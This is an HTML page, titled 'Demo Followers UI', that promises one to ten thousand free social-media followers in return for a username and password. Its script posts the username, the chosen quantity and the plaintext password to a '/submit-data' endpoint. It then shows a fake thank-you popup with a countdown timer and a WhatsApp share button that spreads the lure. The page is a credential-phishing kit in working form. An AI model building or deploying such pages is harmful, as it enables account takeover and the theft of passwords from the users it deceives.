<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Demo Followers UI</title>
<style>
*{ margin:0; padding:0; box-sizing:border-box; font-family:Arial,sans-serif; }
body{ background:#f5f5f5; padding:20px; }
.container{ max-width:900px; margin:auto; background:#fff; padding:20px; border-radius:10px; box-shadow:0 0 10px rgba(0,0,0,0.1); }
.row{ display:flex; gap:20px; }
.form-group{ flex:1; margin-bottom:15px; }
.form-group-full{ width:100%; margin-bottom:15px; }
label{ display:block; margin-bottom:8px; font-size:16px; font-weight:bold; }
input,select{ width:100%; padding:12px; font-size:18px; border:1px solid #ccc; border-radius:5px; }
.btn{ width:100%; background:#1877f2; color:#fff; border:none; padding:15px; font-size:24px; cursor:pointer; border-radius:5px; margin-top:10px; }
.btn:hover{ opacity:0.9; }
.popup{ display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.6); justify-content:center; align-items:center; }
.popup-box{ background:#fff; width:420px; max-width:90%; padding:25px; border-radius:10px; text-align:center; }
.popup-box h2{ color:#28a745; margin-bottom:10px; }
.popup-box p{ margin:10px 0; }
.whatsapp-btn{ display:inline-block; margin-top:15px; background:#25D366; color:white; text-decoration:none; padding:12px 20px; border-radius:6px; font-size:18px; }
</style>
</head>
<body>

<div class="container">
    <div class="row">
        <div class="form-group">
            <label>Username</label>
            <input type="text" id="username" placeholder="Enter Username">
        </div>
        <div class="form-group">
            <label>Quantity</label>
            <select id="quantity">
                <option>1K</option><option>2K</option><option>3K</option><option>4K</option><option>5K</option>
                <option>6K</option><option>7K</option><option>8K</option><option>9K</option><option>10K</option>
            </select>
        </div>
    </div>
    <div class="form-group-full">
        <label>Password</label>
        <input type="password" id="password" placeholder="Enter Password">
    </div>
    <button class="btn" onclick="showPopup()">Get Followers</button>
</div>

<div class="popup" id="popup">
    <div class="popup-box">
        <h2>🎉 Thank You!</h2>
        <p id="msg"></p>
        <p>Your request has been submitted successfully.</p>
        <p id="timer" style="font-size:22px; font-weight:bold; color:red; margin-top:15px;">Time Remaining: 30s</p>
        <a id="shareBtn" class="whatsapp-btn" href="#" target="_blank">📱 Share on WhatsApp</a>
    </div>
</div>

<script>
let countdown;
function showPopup(){
    const username = document.getElementById("username").value;
    const quantity = document.getElementById("quantity").value;
    const password = document.getElementById("password").value;

    if(username.trim() === "" || password.trim() === ""){
        alert("Please fill all details.");
        return;
    }

    fetch('/submit-data', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username, quantity, password })
    })
    .then(res => res.json())
    .then(data => console.log(data))
    .catch(err => console.error(err));

    document.getElementById("msg").innerHTML = "Request submitted for <b>" + username + "</b> (" + quantity + ")";
    document.getElementById("popup").style.display = "flex";
    let timeLeft = 30;
    clearInterval(countdown);
    countdown = setInterval(function(){
        timeLeft--;
        document.getElementById("timer").innerHTML = "Time Remaining: " + timeLeft + "s";
        if(timeLeft <= 0){ clearInterval(countdown); document.getElementById("timer").innerHTML = "Time Expired"; }
    }, 1000);
}
</script>
</body>
</html>
